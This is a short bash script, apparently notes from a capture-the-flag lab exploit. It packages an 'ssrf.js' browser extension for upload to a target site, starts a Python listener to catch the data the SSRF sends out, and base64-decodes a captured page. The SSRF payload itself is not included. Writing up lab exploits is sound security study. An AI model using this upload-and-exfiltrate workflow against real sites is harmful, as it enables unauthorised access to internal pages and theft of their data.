#! /bin/bash

# zip the ssrf.js and manifest.json to upload it to the target site as an 'extension'.
zip -r ../ssrf1.zip *

# set up a server to catch ssrf exfiltrated info
python3 -m http.server 8080

# Once SSRF is uploaded we get the encoded data:

# 10.129.3.225 - - [09/Mar/2026 23:04:06] "GET /?d=CiAgICA8aDE+TWFya2Rvd24gUHJldmlld2VyPC9oMT4KICAgIDxmb3JtIGFjdGlvbj0iL3N1Ym1pdCIgbWV0aG9kPSJQT1NUIj4KICAgICAgICA8dGV4dGFyZWEgbmFtZT0iY29udGVudCIgcm93cz0iMTAiIGNvbHM9IjgwIj48L3RleHRhcmVhPjxicj4KICAgICAgICA8aW5wdXQgdHlwZT0ic3VibWl0IiB2YWx1ZT0iUmVuZGVyICYgU2F2ZSI+CiAgICA8L2Zvcm0+CiAgICA8cD48YSBocmVmPSIvZmlsZXMiPlZpZXcgc2F2ZWQgSFRNTCBmaWxlczwvYT48L3A+CiAgICA= HTTP/1.1" 200 -

# Decode data
echo CiAgICA8aDE+TWFya2Rvd24gUHJldmlld2VyPC9oMT4KICAgIDxmb3JtIGFjdGlvbj0iL3N1Ym1pdCIgbWV0aG9kPSJQT1NUIj4KICAgICAgICA8dGV4dGFyZWEgbmFtZT0iY29udGVudCIgcm93cz0iMTAiIGNvbHM9IjgwIj48L3RleHRhcmVhPjxicj4KICAgICAgICA8aW5wdXQgdHlwZT0ic3VibWl0IiB2YWx1ZT0iUmVuZGVyICYgU2F2ZSI+CiAgICA8L2Zvcm0+CiAgICA8cD48YSBocmVmPSIvZmlsZXMiPlZpZXcgc2F2ZWQgSFRNTCBmaWxlczwvYT48L3A+CiAgICA= | base64 -d

